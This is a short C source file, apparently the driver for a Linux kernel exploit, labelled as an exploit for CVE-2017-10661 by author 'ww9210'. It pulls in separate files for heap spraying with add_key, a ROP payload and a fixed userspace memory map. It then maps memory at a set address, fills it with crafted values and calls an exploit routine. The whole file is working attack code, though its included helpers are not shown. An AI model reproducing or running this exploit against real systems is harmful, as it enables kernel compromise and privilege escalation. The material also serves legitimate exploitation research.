// author ww9210
// exploit for cve-2017-10661
long r[49];
#include "heapspray_addkey_1.c"
#include "rop_payload.c"
#include "userspace_base_mmap_1.c"
#include "the_use.h"
#include "poc_10661.h"

int main()
{
  r[0] = syscall(__NR_mmap, 0x20000000ul, 0xe26000ul, 0x3ul, 0x32ul,
                 0xfffffffffffffffful, 0x0ul);
  *(uint64_t*)0x20213f30 = (uint64_t)0x101;
  *(uint64_t*)0x20213f38 = (uint64_t)0xfffffffffffffffc;
  *(uint64_t*)0x20213f40 = (uint64_t)0x5;
  *(uint64_t*)0x20213f48 = (uint64_t)0x9;
  *(uint64_t*)0x20213f50 = (uint64_t)0xffffffffffff0000;
  *(uint64_t*)0x20213f58 = (uint64_t)0xffff;
  *(uint64_t*)0x20213f60 = (uint64_t)0x9;
  *(uint64_t*)0x20213f68 = (uint64_t)0x0;
  *(uint64_t*)0x20213f70 = (uint64_t)0x1;
  *(uint64_t*)0x20213f78 = (uint64_t)0xff;
  *(uint64_t*)0x20213f80 = (uint64_t)0x7;
  *(uint64_t*)0x20213f88 = (uint64_t)0x2;
  *(uint64_t*)0x20213f90 = (uint64_t)0x800;
  *(uint64_t*)0x20213f98 = (uint64_t)0xfff;
  *(uint64_t*)0x20213fa0 = (uint64_t)0x101;
  *(uint64_t*)0x20213fa8 = (uint64_t)0x100;
  *(uint64_t*)0x20213fb0 = (uint64_t)0x3;
  *(uint64_t*)0x20213fb8 = (uint64_t)0x7;
  *(uint64_t*)0x20213fc0 = (uint64_t)0x100000000;
  *(uint64_t*)0x20213fc8 = (uint64_t)0x101;
  *(uint64_t*)0x20213fd0 = (uint64_t)0x3f;
  *(uint64_t*)0x20213fd8 = (uint64_t)0x40;
  *(uint64_t*)0x20213fe0 = (uint64_t)0x2;
  *(uint64_t*)0x20213fe8 = (uint64_t)0x6;
  *(uint64_t*)0x20213ff0 = (uint64_t)0x8001;
  *(uint64_t*)0x20213ff8 = (uint64_t)0x1;
  main_10661();
  return 0;
}
